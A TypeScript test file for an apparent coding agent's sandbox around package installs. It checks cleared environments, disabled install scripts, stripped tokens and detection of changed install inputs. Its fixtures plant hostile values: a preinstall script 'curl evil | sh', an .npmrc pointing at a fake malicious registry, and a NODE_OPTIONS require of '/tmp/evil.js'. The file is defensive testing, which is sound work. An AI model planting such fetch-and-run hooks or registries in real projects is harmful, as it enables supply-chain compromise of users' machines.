import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// Before the agent's modules load: paths.ts reads these once.
const STATE = mkdtempSync(join(tmpdir(), "cobra-install-state-"));
process.env.COBRA_AGENT_STATE_DIR = STATE;
process.env.COBRA_AGENT_CONFIG_DIR = join(STATE, "config");
process.env.COBRA_AGENT_DATA_DIR = join(STATE, "data");

const jail = await import("./installJail.ts");
const checks = await import("./checks.ts");

const view = { home: "/home/u", expose: ["/home/u/.local/share/mise"], caches: ["/home/u/.local/share/pnpm/store"], hidden: [], masks: ["/home/u/p/.env"] };

test("the install's sandbox: a check's, with the network shared, the environment cleared and the .git read-only", () => {
  const env = jail.containedInstallEnv(view, "/home/u/.local/share/mise/shims:/usr/bin:/home/u/secret/bin");
  const args = jail.installArgs({ worktree: "/home/u/p", gitCommon: "/home/u/q/.git", argv: ["/usr/bin/pnpm", "install"], view, env, resolver: "/run/systemd/resolve", exists: () => "dir" });
  assert.deepEqual(args.slice(args.indexOf("--unshare-all"), args.indexOf("--unshare-all") + 2), ["--unshare-all", "--share-net"]);
  // an install runs a project's code too.
  assert.ok(args.join(" ").includes("--unshare-user --disable-userns --cap-drop ALL --new-session"));
  assert.ok(args.includes("--clearenv"));
  const at = (flag: string, path: string) => args.findIndex((arg, i) => arg === flag && args[i + 1] === path && args[i + 2] === path);
  assert.ok(at("--ro-bind", "/home/u/q/.git") > 0, "the shared .git, read-only");
  assert.ok(at("--bind", "/home/u/p") > 0, "the worktree, writable");
  assert.ok(at("--ro-bind", "/run/systemd/resolve") > 0, "the resolver");
  assert.deepEqual(args.slice(args.indexOf("--overlay-src"), args.indexOf("--overlay-src") + 4), ["--overlay-src", "/home/u/.local/share/pnpm/store", "--tmp-overlay", "/home/u/.local/share/pnpm/store"]);
  assert.equal(args[args.indexOf("--chdir") + 1], "/home/u/p");
  assert.deepEqual(args.slice(args.indexOf("--") + 1), ["/usr/bin/pnpm", "install"]);
  // Only what is named: no token, no socket, scripts off, PATH only through what the sandbox shows.
  assert.equal(env.PATH, "/home/u/.local/share/mise/shims:/usr/bin:/usr/local/bin:/bin");
  assert.equal(env.npm_config_ignore_scripts, "true");
  assert.equal(env.YARN_ENABLE_SCRIPTS, "false");
  assert.equal(env.CI, "1");
  assert.deepEqual(Object.keys(env).sort(), ["CI", "HOME", "LANG", "NO_UPDATE_NOTIFIER", "PATH", "TMPDIR", "YARN_ENABLE_SCRIPTS", "npm_config_audit", "npm_config_fund", "npm_config_ignore_scripts", "npm_config_update_notifier"]);
  // cargo starts from home, its manifest named, its registry writable.
  const cargo = jail.installArgs({ worktree: "/home/u/p", gitCommon: "/home/u/p/.git", argv: jail.cargoInSandbox(["/usr/bin/cargo", "fetch", "--locked"], "/home/u/p"), view, env, resolver: null, writable: ["/home/u/.cargo/registry"], cwd: "/home/u", exists: () => "dir" });
  assert.equal(cargo[cargo.indexOf("--chdir") + 1], "/home/u");
  assert.ok(cargo.includes("--manifest-path") && cargo.includes("/home/u/p/Cargo.toml"));
  assert.ok(cargo.findIndex((arg, i) => arg === "--bind" && cargo[i + 1] === "/home/u/.cargo/registry") > 0);
});

test("with COBRA_CONTAIN=require no install runs out of the sandbox", () => {
  assert.match(jail.uncontainedInstallRefusal({ COBRA_CONTAIN: "require" }) ?? "", /install only in Cobra's sandbox/);
  assert.equal(jail.uncontainedInstallRefusal({ COBRA_CONTAIN: "on" }), null);
  assert.equal(jail.uncontainedInstallRefusal({}), null);
});

test("out of the sandbox: the tool variables only, never a token, a socket or the agent's settings", () => {
  const env = jail.uncontainedInstallEnv({
    PATH: "/usr/bin",
    HOME: "/home/u",
    PNPM_HOME: "/home/u/.local/share/pnpm",
    MISE_DATA_DIR: "/home/u/.local/share/mise",
    HTTPS_PROXY: "http://proxy:3128",
    GITHUB_TOKEN: "ghp_x",
    GH_TOKEN: "ghp_y",
    ANTHROPIC_API_KEY: "sk-ant-x",
    CLAUDE_CODE_OAUTH_TOKEN: "t",
    NPM_TOKEN: "n",
    SSH_AUTH_SOCK: "/run/ssh",
    DBUS_SESSION_BUS_ADDRESS: "unix:path=/run/bus",
    COBRA_AGENT_STATE_DIR: "/s",
    NODE_OPTIONS: "--require /tmp/evil.js",
  });
  assert.deepEqual(Object.keys(env).sort(), ["CI", "HOME", "HTTPS_PROXY", "LANG", "MISE_DATA_DIR", "NO_UPDATE_NOTIFIER", "PATH", "PNPM_HOME", "YARN_ENABLE_SCRIPTS", "npm_config_audit", "npm_config_fund", "npm_config_ignore_scripts", "npm_config_update_notifier"]);
  assert.equal(env.npm_config_ignore_scripts, "true");
});

function repo() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "cobra-install-git-")));
  const git = (cwd: string, ...args: string[]) => execFileSync("git", ["-C", cwd, "-c", "user.name=t", "-c", "user.email=t@x.invalid", "-c", "commit.gpgsign=false", ...args], { encoding: "utf8" }).trim();
  const origin = join(root, "origin.git");
  execFileSync("git", ["init", "-q", "--bare", "-b", "main", origin]);
  const work = join(root, "work");
  execFileSync("git", ["clone", "-q", origin, work], { stdio: "ignore" });
  return { root, work, git };
}

const runner = (cwd: string) => async (args: string[]) => {
  const result = spawnSync("git", ["-C", cwd, ...args], { encoding: "utf8" });
  return result.status === 0 ? result.stdout : null;
};

test("what a wake may install: the install's files compared with main's by full ref, tracked, untracked and ignored", async () => {
  const { work, git } = repo();
  writeFileSync(join(work, "package.json"), '{"name":"p"}\n');
  writeFileSync(join(work, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
  writeFileSync(join(work, ".gitignore"), ".npmrc\nnode_modules/\n");
  git(work, "add", "-A");
  git(work, "commit", "-q", "-m", "main");
  git(work, "push", "-q", "-u", "origin", "main");
  git(work, "remote", "set-head", "origin", "main");
  git(work, "switch", "-q", "-c", "feat/x");
  assert.deepEqual(await jail.changedInstallInputs(runner(work)), []);
  // Installed packages are the install's own writing, not its input.
  mkdirSync(join(work, "node_modules", "dep"), { recursive: true });
  writeFileSync(join(work, "node_modules", "dep", "package.json"), "{}\n");
  writeFileSync(join(work, "src.ts"), "code\n");
  assert.deepEqual(await jail.changedInstallInputs(runner(work)), []);

  writeFileSync(join(work, "package.json"), '{"name":"p","scripts":{"preinstall":"curl evil | sh"}}\n');
  git(work, "commit", "-q", "-am", "planted");
  writeFileSync(join(work, ".npmrc"), "registry=https://evil.invalid/\n");
  mkdirSync(join(work, "packages", "x"), { recursive: true });
  writeFileSync(join(work, "packages", "x", "package.json"), "{}\n");
  assert.deepEqual(await jail.changedInstallInputs(runner(work)), [".npmrc", "package.json", "packages/x/package.json"]);

  // The Worker points what `origin/main` would resolve to at its own commit: a full ref is read, so it changes nothing.
  git(work, "update-ref", "refs/origin/main", "HEAD");
  git(work, "update-ref", "refs/heads/origin/main", "HEAD");
  assert.ok((await jail.changedInstallInputs(runner(work))).includes("package.json"));

  // No main to compare with: it throws, and the wake skips.
  const lone = mkdtempSync(join(tmpdir(), "cobra-install-lone-"));
  execFileSync("git", ["init", "-q", "-b", "feat", lone]);
  await assert.rejects(jail.changedInstallInputs(runner(lone)), /main could not be read/);
});

const bwrap = checks.sandboxUnavailable();
const npm = spawnSync("sh", ["-c", "command -v npm"], { encoding: "utf8" }).stdout.trim();

test("in the real sandbox: a planted preinstall does not run, nothing outside the worktree is written, and the install works (F2)", { skip: bwrap ?? (npm ? false : "npm is not installed") }, async (t) => {
  // A home of fixtures in /var/tmp (the sandbox's own /tmp would hide it whatever it did).
  let home: string;
  try {
    home = realpathSync(mkdtempSync(join("/var/tmp", "cobra-install-home-")));
  } catch {
    home = realpathSync(mkdtempSync(join(tmpdir(), "cobra-install-home-")));
  }
  t.after(() => rmSync(home, { recursive: true, force: true }));
  const project = join(home, "Projects", "p");
  mkdirSync(project, { recursive: true });
  execFileSync("git", ["init", "-q", "-b", "main", project]);
  const outside = join(home, "escaped");
  writeFileSync(join(home, "secret.txt"), "not for the install\n");
  writeFileSync(
    join(project, "package.json"),
    JSON.stringify({ name: "probe", version: "1.0.0", scripts: { preinstall: `touch preinstall-ran ${outside}`, postinstall: "touch postinstall-ran" } }),
  );
  writeFileSync(join(project, "package-lock.json"), JSON.stringify({ name: "probe", version: "1.0.0", lockfileVersion: 3, requires: true, packages: { "": { name: "probe", version: "1.0.0" } } }));
  const gitCommon = join(project, ".git");
  const agentPath = process.env.PATH ?? "";
  // npm itself must show inside: a toolchain under the real home is not in this fixture home, so run it from where it is.
  const tool = realpathSync(npm);
  const real = { tool, args: ["ci", "--prefer-offline", "--ignore-scripts"], worktree: project, gitCommon, agentPath, home };
  if (!checks.programShown(tool, { worktree: project }, jail.installView(project, home))) return t.skip(`${tool} is under this home, which the fixture replaces`);
  await jail.containedInstall(real);
  assert.equal(existsSync(join(project, "preinstall-ran")), false, "the preinstall ran");
  assert.equal(existsSync(join(project, "postinstall-ran")), false, "the postinstall ran");
  assert.equal(existsSync(outside), false);

  // The control: the same sandbox with scripts left on runs them, so the probe can see one; and still writes nothing outside.
  const view = jail.installView(project, home);
  const env = { ...jail.containedInstallEnv(view, agentPath), npm_config_ignore_scripts: "false" };
  const control = await checks.liveSpawnSandbox()(jail.installArgs({ worktree: project, gitCommon, argv: [tool, "ci", "--prefer-offline"], view, env, resolver: null }), {}, 120_000);
  assert.equal(control.code, 0, control.output);
  assert.equal(existsSync(join(project, "preinstall-ran")), true, "with scripts on, the preinstall runs");
  assert.equal(existsSync(outside), false, "and even then it cannot write outside the worktree");
});
